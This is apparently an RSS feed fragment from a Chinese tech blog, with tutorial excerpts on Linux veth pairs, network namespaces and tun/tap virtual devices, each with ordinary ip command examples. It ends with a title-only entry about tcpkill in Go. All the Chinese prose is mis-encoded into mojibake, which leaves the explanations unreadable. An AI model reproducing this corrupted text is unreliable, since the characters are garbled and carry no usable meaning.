      <description>&lt;h1 id=&#34;linux-veth-pair-è¯¦è§£&#34;&gt;Linux veth pair è¯¦è§£&lt;/h1&gt;
&lt;p&gt;veth pairæ˜¯æˆå¯¹å‡ºç°çš„ä¸€ç§è™šæ‹Ÿç½‘ç»œè®¾å¤‡æ¥å£ï¼Œä¸€ç«¯è¿ç€ç½‘ç»œåè®®æ ˆï¼Œä¸€ç«¯å½¼æ­¤ç›¸è¿ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;virtual-device-veth-1&#34; loading=&#34;lazy&#34; src=&#34;https://oss.typesafe.cn/virtual-device-veth-1.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç”±äºå®ƒçš„è¿™ä¸ªç‰¹æ€§ï¼Œå¸¸å¸¸è¢«ç”¨äºæ„å»ºè™šæ‹Ÿç½‘ç»œæ‹“æ‰‘ã€‚ä¾‹å¦‚è¿æ¥ä¸¤ä¸ªä¸åŒçš„ç½‘ç»œå‘½åç©ºé—´(netns)ï¼Œè¿æ¥dockerå®¹å™¨ï¼Œè¿æ¥ç½‘æ¡¥(Bridge)ç­‰ï¼Œå…¶ä¸­ä¸€ä¸ªå¾ˆå¸¸è§çš„æ¡ˆä¾‹å°±æ˜¯OpenStack Neutronåº•å±‚ç”¨å®ƒæ¥æ„å»ºéå¸¸å¤æ‚çš„ç½‘ç»œæ‹“æ‰‘ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å¦‚ä½•ä½¿ç”¨&#34;&gt;å¦‚ä½•ä½¿ç”¨ï¼Ÿ&lt;/h2&gt;
&lt;p&gt;åˆ›å»ºä¸€å¯¹veth&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ip link add &amp;lt;veth name&amp;gt; type veth peer name &amp;lt;peer name&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;å®éªŒ&#34;&gt;å®éªŒ&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬æ”¹é€ ä¸Šä¸€èŠ‚å®Œæˆçš„netnså®éªŒï¼Œä½¿ç”¨veth pairå°†ä¸¤ä¸ªçš„éš”ç¦»netnsè¿æ¥èµ·æ¥ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;https://oss.typesafe.cn/vethpair.png&#34; loading=&#34;lazy&#34; src=&#34;https://oss.typesafe.cn/vethpair.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬é¦–å…ˆåˆ›å»ºä¸€å¯¹vethè®¾å¤‡ï¼Œå°†vethè®¾å¤‡åˆ†åˆ«ç§»åŠ¨åˆ°ä¸¤ä¸ªnetnsä¸­å¹¶å¯åŠ¨ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# åˆ›å»ºä¸€å¯¹veth&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip link add veth0 type veth peer name veth1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# å°†vethç§»åŠ¨åˆ°netnsä¸­&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip link set veth0 netns ns0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip link set veth1 netns ns1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# å¯åŠ¨&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns0 ip link set veth0 up
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns1 ip link set veth1 up
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ¥ä¸‹æ¥æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linux Network Namespace (netns) è¯¦è§£</title>
      <link>https://www.typesafe.cn/posts/linux-netns/</link>
      <pubDate>Sun, 08 Nov 2020 23:12:00 +0000</pubDate>
      <guid>https://www.typesafe.cn/posts/linux-netns/</guid>
      <description>&lt;p&gt;Network Namespace ï¼ˆä»¥ä¸‹ç®€ç§°netnsï¼‰æ˜¯Linuxå†…æ ¸æä¾›çš„ä¸€é¡¹å®ç°ç½‘ç»œéš”ç¦»çš„åŠŸèƒ½ï¼Œå®ƒèƒ½éš”ç¦»å¤šä¸ªä¸åŒçš„ç½‘ç»œç©ºé—´ï¼Œå¹¶ä¸”å„è‡ªæ‹¥æœ‰ç‹¬ç«‹çš„ç½‘ç»œåè®®æ ˆï¼Œè¿™å…¶ä¸­ä¾¿åŒ…æ‹¬äº†ç½‘ç»œæ¥å£ï¼ˆç½‘å¡ï¼‰ï¼Œè·¯ç”±è¡¨ï¼Œiptablesè§„åˆ™ç­‰ã€‚ä¾‹å¦‚å¤§åé¼é¼çš„dockerä¾¿æ˜¯åŸºäºnetnså®ç°çš„ç½‘ç»œéš”ç¦»ï¼Œä»Šå¤©æˆ‘ä»¬å°±æ¥æ‰‹åŠ¨å®éªŒä¸€ä¸‹netnsçš„éš”ç¦»ç‰¹æ€§ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ä½¿ç”¨æ–¹å¼&#34;&gt;ä½¿ç”¨æ–¹å¼&lt;/h3&gt;
&lt;p&gt;ä½¿ç”¨&lt;code&gt;ip netns help&lt;/code&gt;æŸ¥çœ‹ä½¿ç”¨å¸®åŠ©&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Usage: ip netns list
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       ip netns add NAME
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       ip netns set NAME NETNSID
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       ip &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-all&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; netns delete &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;NAME&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       ip netns identify &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;PID&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       ip netns pids NAME
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       ip &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-all&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; netns exec &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;NAME&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; cmd ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       ip netns monitor
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       ip netns list-id
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;å¼€å§‹å®éªŒ&#34;&gt;å¼€å§‹å®éªŒ&lt;/h3&gt;
&lt;p&gt;æˆ‘ä»¬å°†è¦æ„å»ºå¦‚ä¸‹å›¾çš„ç½‘ç»œ&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;https://oss.typesafe.cn/netns.png&#34; loading=&#34;lazy&#34; src=&#34;https://oss.typesafe.cn/netns.png?t=2&#34;&gt;&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæˆ‘ä»¬æ·»åŠ ä¸¤ä¸ªtapè®¾å¤‡å¹¶é…ç½®ä¸ŠIPä¿¡æ¯ï¼Œç„¶åæ·»åŠ ä¸¤ä¸ªnetnsï¼Œæœ€åå°†tapè®¾å¤‡ç§»åŠ¨åˆ°netnsä¸­&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# æ·»åŠ å¹¶å¯åŠ¨è™šæ‹Ÿç½‘å¡tapè®¾å¤‡&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip tuntap add dev tap0 mode tap 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip tuntap add dev tap1 mode tap 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip link set tap0 up
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip link set tap1 up
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# é…ç½®IP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip addr add 10.0.0.1/24 dev tap0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip addr add 10.0.0.2/24 dev tap1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# æ·»åŠ netns&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns add ns0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns add ns1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# å°†è™šæ‹Ÿç½‘å¡tap0ï¼Œtap1åˆ†åˆ«ç§»åŠ¨åˆ°ns0å’Œns1ä¸­&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip link set tap0 netns ns0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip link set tap1 netns ns1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨å®¿ä¸»æœºå™¨ä¸Šä½¿ç”¨&lt;code&gt;ping 10.0.0.1&lt;/code&gt;æµ‹è¯•ä¸tap0çš„ç½‘ç»œè¿é€šæ€§&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linux tun/tap è¯¦è§£</title>
      <link>https://www.typesafe.cn/posts/linux-tun-tap/</link>
      <pubDate>Sun, 08 Nov 2020 22:11:00 +0000</pubDate>
      <guid>https://www.typesafe.cn/posts/linux-tun-tap/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;åœ¨è®¡ç®—æœºç½‘ç»œä¸­ï¼Œ&lt;strong&gt;tun&lt;/strong&gt;ä¸&lt;strong&gt;tap&lt;/strong&gt;æ˜¯æ“ä½œç³»ç»Ÿå†…æ ¸ä¸­çš„è™šæ‹Ÿç½‘ç»œè®¾å¤‡ã€‚ä¸åŒäºæ™®é€šé ç¡¬ä»¶ç½‘ç»œé€‚é…å™¨å®ç°çš„è®¾å¤‡ï¼Œè¿™äº›è™šæ‹Ÿçš„ç½‘ç»œè®¾å¤‡å…¨éƒ¨ç”¨è½¯ä»¶å®ç°ï¼Œå¹¶å‘è¿è¡Œäºæ“ä½œç³»ç»Ÿä¸Šçš„è½¯ä»¶æä¾›ä¸ç¡¬ä»¶çš„ç½‘ç»œè®¾å¤‡å®Œå…¨ç›¸åŒçš„åŠŸèƒ½ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;tuntapæ˜¯ä»€ä¹ˆ&#34;&gt;tun/tapæ˜¯ä»€ä¹ˆï¼Ÿ&lt;/h3&gt;
&lt;p&gt;tunæ˜¯ç½‘ç»œå±‚çš„è™šæ‹Ÿç½‘ç»œè®¾å¤‡ï¼Œå¯ä»¥æ”¶å‘ç¬¬ä¸‰å±‚æ•°æ®æŠ¥æ–‡åŒ…ï¼Œå¦‚IPå°åŒ…ï¼Œå› æ­¤å¸¸ç”¨äºä¸€äº›ç‚¹å¯¹ç‚¹IPéš§é“ï¼Œä¾‹å¦‚OpenVPNï¼ŒIPSecç­‰ã€‚&lt;/p&gt;
&lt;p&gt;tapæ˜¯é“¾è·¯å±‚çš„è™šæ‹Ÿç½‘ç»œè®¾å¤‡ï¼Œç­‰åŒäºä¸€ä¸ªä»¥å¤ªç½‘è®¾å¤‡ï¼Œå®ƒå¯ä»¥æ”¶å‘ç¬¬äºŒå±‚æ•°æ®æŠ¥æ–‡åŒ…ï¼Œå¦‚ä»¥å¤ªç½‘æ•°æ®å¸§ã€‚Tapæœ€å¸¸è§çš„ç”¨é€”å°±æ˜¯åšä¸ºè™šæ‹Ÿæœºçš„ç½‘å¡ï¼Œå› ä¸ºå®ƒå’Œæ™®é€šçš„ç‰©ç†ç½‘å¡æ›´åŠ ç›¸è¿‘ï¼Œä¹Ÿç»å¸¸ç”¨ä½œæ™®é€šæœºå™¨çš„è™šæ‹Ÿç½‘å¡ã€‚&lt;/p&gt;
&lt;h3 id=&#34;å¦‚ä½•æ“ä½œtuntap&#34;&gt;å¦‚ä½•æ“ä½œtun/tapï¼Ÿ&lt;/h3&gt;
&lt;p&gt;Linux tun/tapå¯ä»¥é€šè¿‡ç½‘ç»œæ¥å£å’Œå­—ç¬¦è®¾å¤‡ä¸¤ç§æ–¹å¼è¿›è¡Œæ“ä½œã€‚&lt;/p&gt;
&lt;p&gt;å½“åº”ç”¨ç¨‹åºä½¿ç”¨æ ‡å‡†ç½‘ç»œæ¥å£socket APIæ“ä½œtun/tapè®¾å¤‡æ—¶ï¼Œå’Œæ“ä½œä¸€ä¸ªçœŸå®ç½‘å¡æ— å¼‚ã€‚&lt;/p&gt;
&lt;p&gt;å½“åº”ç”¨ç¨‹åºä½¿ç”¨å­—ç¬¦è®¾å¤‡æ“ä½œtun/tapè®¾å¤‡æ—¶ï¼Œå­—ç¬¦è®¾å¤‡å³å……å½“äº†ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´çš„æ¡¥æ¢ç›´æ¥è¯»å†™äºŒå±‚æˆ–ä¸‰å±‚çš„æ•°æ®æŠ¥æ–‡ã€‚åœ¨ Linux å†…æ ¸ 2.6.x ä¹‹åçš„ç‰ˆæœ¬ä¸­ï¼Œtun/tap å¯¹åº”çš„å­—ç¬¦è®¾å¤‡æ–‡ä»¶åˆ†åˆ«ä¸ºï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tunï¼š/dev/net/tun
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tapï¼š/dev/tap0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å½“åº”ç”¨ç¨‹åºæ‰“å¼€å­—ç¬¦è®¾å¤‡æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åˆ›å»ºå¯¹åº”çš„è™šæ‹Ÿè®¾å¤‡æ¥å£ï¼Œä¸€èˆ¬ä»¥tunXå’ŒtapXæ–¹å¼å‘½åï¼Œè™šæ‹Ÿè®¾å¤‡æ¥å£åˆ›å»ºæˆåŠŸåï¼Œå¯ä»¥ä¸ºå…¶é…ç½®IPã€MACåœ°å€ã€è·¯ç”±ç­‰ã€‚å½“ä¸€åˆ‡é…ç½®å®Œæ¯•ï¼Œåº”ç”¨ç¨‹åºé€šè¿‡æ­¤å­—ç¬¦æ–‡ä»¶è®¾å¤‡å†™å…¥IPå°åŒ…æˆ–ä»¥å¤ªç½‘æ•°æ®å¸§ï¼Œtun/tapçš„é©±åŠ¨ç¨‹åºä¼šå°†æ•°æ®æŠ¥æ–‡ç›´æ¥å‘é€åˆ°å†…æ ¸ç©ºé—´ï¼Œå†…æ ¸ç©ºé—´æ”¶åˆ°æ•°æ®åå†äº¤ç»™ç³»ç»Ÿçš„ç½‘ç»œåè®®æ ˆè¿›è¡Œå¤„ç†ï¼Œæœ€åç½‘ç»œåè®®æ ˆé€‰æ‹©åˆé€‚çš„ç‰©ç†ç½‘å¡å°†å…¶å‘å‡ºï¼Œåˆ°æ­¤å‘é€æµç¨‹å®Œæˆã€‚è€Œç‰©ç†ç½‘å¡æ”¶åˆ°æ•°æ®æŠ¥æ–‡æ—¶ä¼šäº¤ç»™ç½‘ç»œåè®®æ ˆè¿›è¡Œå¤„ç†ï¼Œç½‘ç»œåè®®æ ˆåŒ¹é…åˆ¤æ–­ä¹‹åé€šè¿‡tun/tapçš„é©±åŠ¨ç¨‹åºå°†æ•°æ®æŠ¥æ–‡åŸå°ä¸åŠ¨çš„å†™å…¥åˆ°å­—ç¬¦è®¾å¤‡ä¸Šï¼Œåº”ç”¨ç¨‹åºä»å­—ç¬¦è®¾å¤‡ä¸Šè¯»å–åˆ°IPå°åŒ…æˆ–ä»¥å¤ªç½‘æ•°æ®å¸§ï¼Œæœ€åè¿›è¡Œç›¸åº”çš„å¤„ç†ï¼Œæ”¶å–æµç¨‹å®Œæˆã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æ³¨æ„ï¼šå½“åº”ç”¨ç¨‹åºå…³é—­å­—ç¬¦è®¾å¤‡æ—¶ï¼Œç³»ç»Ÿä¹Ÿä¼šè‡ªåŠ¨åˆ é™¤å¯¹åº”çš„è™šæ‹Ÿè®¾å¤‡æ¥å£ï¼Œå¹¶ä¸”ä¼šåˆ é™¤æ‰åˆ›å»ºçš„è·¯ç”±ç­‰ä¿¡æ¯ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;tuntapçš„åŒºåˆ«&#34;&gt;tun/tapçš„åŒºåˆ«&lt;/h3&gt;
&lt;p&gt;tun/tap è™½ç„¶å·¥ä½œåŸç†ä¸€è‡´ï¼Œä½†æ˜¯å·¥ä½œçš„å±‚æ¬¡ä¸ä¸€æ ·ã€‚&lt;/p&gt;
&lt;p&gt;tunæ˜¯ä¸‰å±‚ç½‘ç»œè®¾å¤‡ï¼Œæ”¶å‘çš„æ˜¯IPå±‚æ•°æ®åŒ…ï¼Œæ— æ³•å¤„ç†ä»¥å¤ªç½‘æ•°æ®å¸§ï¼Œä¾‹å¦‚OpenVPNçš„è·¯ç”±æ¨¡å¼å°±æ˜¯ä½¿ç”¨äº†tunç½‘ç»œè®¾å¤‡ï¼ŒOpenVPN Serveré‡æ–°è§„åˆ’äº†ä¸€ä¸ªç½‘æ®µï¼Œæ‰€æœ‰çš„å®¢æˆ·ç«¯éƒ½ä¼šè·å–åˆ°è¯¥ç½‘æ®µä¸‹çš„ä¸€ä¸ªIPï¼Œå¹¶ä¸”ä¼šæ·»åŠ å¯¹åº”çš„è·¯ç”±è§„åˆ™ï¼Œè€Œå®¢æˆ·ç«¯ä¸ç›®æ ‡æœºå™¨äº§ç”Ÿçš„æ•°æ®æŠ¥æ–‡éƒ½è¦ç»è¿‡OpenVPNç½‘å…³æ‰èƒ½è½¬å‘ã€‚&lt;/p&gt;
&lt;p&gt;tapæ˜¯äºŒå±‚ç½‘ç»œè®¾å¤‡ï¼Œæ”¶å‘ä»¥å¤ªç½‘æ•°æ®å¸§ï¼Œæ‹¥æœ‰MACå±‚çš„åŠŸèƒ½ï¼Œå¯ä»¥å’Œç‰©ç†ç½‘å¡é€šè¿‡ç½‘æ¡¥ç›¸è¿ï¼Œç»„æˆä¸€ä¸ªäºŒå±‚ç½‘ç»œã€‚ä¾‹å¦‚OpenVPNçš„æ¡¥æ¥æ¨¡å¼å¯ä»¥ä»å¤–éƒ¨æ‰“ä¸€æ¡éš§é“åˆ°æœ¬åœ°ç½‘ç»œã€‚è¿›æ¥çš„æœºå™¨å°±åƒæœ¬åœ°çš„æœºå™¨ä¸€æ ·å‚ä¸é€šè®¯ï¼Œä¸æ¯«çœ‹ä¸å‡ºè¿™äº›æœºå™¨æ˜¯åœ¨è¿œç¨‹ã€‚å¦‚æœä½ æœ‰ä½¿ç”¨è¿‡è™šæ‹Ÿæœºçš„ç»éªŒï¼Œæ¡¥æ¥æ¨¡å¼ä¹Ÿæ˜¯ä¸€ç§ååˆ†å¸¸è§çš„ç½‘ç»œæ–¹æ¡ˆï¼Œè™šæ‹Ÿæœºä¼šåˆ†é…åˆ°å’Œå®¿ä¸»æœºå™¨åŒç½‘æ®µçš„IPï¼Œå…¶ä»–åŒç½‘æ®µçš„æœºå™¨ä¹Ÿå¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®åˆ°è¿™å°è™šæ‹Ÿæœºã€‚&lt;/p&gt;
&lt;h3 id=&#34;ä½¿ç”¨æ–¹å¼&#34;&gt;ä½¿ç”¨æ–¹å¼&lt;/h3&gt;
&lt;p&gt;Linux æä¾›äº†ä¸€äº›å‘½ä»¤è¡Œç¨‹åºæ–¹ä¾¿æˆ‘ä»¬æ¥åˆ›å»ºæŒä¹…åŒ–çš„tun/tapè®¾å¤‡ï¼Œä½†æ˜¯å¦‚æœæ²¡æœ‰åº”ç”¨ç¨‹åºæ‰“å¼€å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œtun/tapçš„çŠ¶æ€ä¸€ç›´ä¼šæ˜¯DOWNï¼Œè¿˜å¥½çš„æ˜¯è¿™å¹¶ä¸ä¼šå½±å“æˆ‘ä»¬æŠŠå®ƒå½“ä½œæ™®é€šç½‘å¡å»ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨&lt;code&gt;ip tuntap help&lt;/code&gt;æŸ¥çœ‹ä½¿ç”¨å¸®åŠ©&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Usage: ip tuntap &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; add | del | show | list | lst | help &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; dev PHYS_DEV &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; mode &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; tun | tap &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; user USER &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; group GROUP &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; one_queue &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; pi &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; vnet_hdr &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; multi_queue &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; name NAME &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Where:	USER  :&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; STRING | NUMBER &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	GROUP :&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; STRING | NUMBER &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ç¤ºä¾‹&#34;&gt;ç¤ºä¾‹&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# åˆ›å»º tap &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip tuntap add dev tap0 mode tap 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# åˆ›å»º tun&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip tuntap add dev tun0 mode tun 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# åˆ é™¤ tap&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip tuntap del dev tap0 mode tap
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# åˆ é™¤ tun&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip tuntap del dev tun0 mode tun 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;tun/tap è®¾å¤‡åˆ›å»ºæˆåŠŸåå¯ä»¥å½“ä½œæ™®é€šçš„ç½‘å¡ä¸€æ ·ä½¿ç”¨ï¼Œå› æ­¤æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡&lt;code&gt;ip link&lt;/code&gt;å‘½ä»¤æ¥æ“ä½œå®ƒã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>tcpkillåœ¨goè¯­è¨€ä¸‹çš„å®ç°å’Œå¢å¼º</title>
      <link>https://www.typesafe.cn/posts/tcpwall/</link>
      <pubDate>Sat, 31 Oct 2020 00:00:00 +0000</pubDate>
      <guid>https://www.typesafe.cn/posts/tcpwall/</guid>
